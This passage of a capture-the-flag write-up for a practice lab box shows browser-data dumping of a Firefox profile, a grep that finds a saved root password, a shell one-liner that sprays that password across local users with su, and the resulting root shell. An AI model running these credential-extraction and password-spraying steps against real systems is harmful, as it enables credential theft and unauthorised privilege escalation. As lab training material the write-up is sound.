[NOTICE] [browsingdata.go:73,Output] output to file hack-browser-data-results/firefox_esmhp32w_default_default_history.json success
[NOTICE] [browsingdata.go:73,Output] output to file hack-browser-data-results/firefox_esmhp32w_default_default_localstorage.json success
[NOTICE] [browsingdata.go:73,Output] output to file hack-browser-data-results/firefox_esmhp32w_default_default_cookie.json success
[NOTICE] [browsingdata.go:73,Output] output to file hack-browser-data-results/firefox_esmhp32w_default_default_extension.json success
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ grep -rin passw -E5 hack-browser-data-results
hack-browser-data-results/firefox_esmhp32w_default_default_password.json-1-[
hack-browser-data-results/firefox_esmhp32w_default_default_password.json-2-  {
hack-browser-data-results/firefox_esmhp32w_default_default_password.json-3-    "UserName": "root",
hack-browser-data-results/firefox_esmhp32w_default_default_password.json:4:    "Password": "S8Y389KJqWpJuSwFqFZHwfZ3GnegUa",
hack-browser-data-results/firefox_esmhp32w_default_default_password.json-5-    "LoginURL": "https://localhost:10000",
hack-browser-data-results/firefox_esmhp32w_default_default_password.json-6-    "CreateDate": "2020-08-16T23:25:17+08:00"
hack-browser-data-results/firefox_esmhp32w_default_default_password.json-7-  }
hack-browser-data-results/firefox_esmhp32w_default_default_password.json-8-]
```

### Password spraying

Spray the password on local users that have shell

```bash
PASS='S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'; for USER in $(cat /etc/passwd|grep sh$|awk -F: '{print $1}'); do (x=$(echo $PASS | su $USER -c whoami 2>/dev/null); if [ "$x" ]; then echo "[+] $USER"; fi) & done
```

![](/assets/obsidian/975393c23b2d8efc806b008ce58ffbc8.png)

```bash
[elliot@insanityhosting ~]$ su - root
Password:S8Y389KJqWpJuSwFqFZHwfZ3GnegUa
Last login: Sun Jun 16 17:51:17 BST 2024
[root@insanityhosting ~]# id
uid=0(root) gid=0(root) groups=0(root)
```

# Post Exploitation


## System Proof Screenshot

![](/assets/obsidian/98f57b8919a5adc8c1b0de1464d531e6.png)

# Appendix

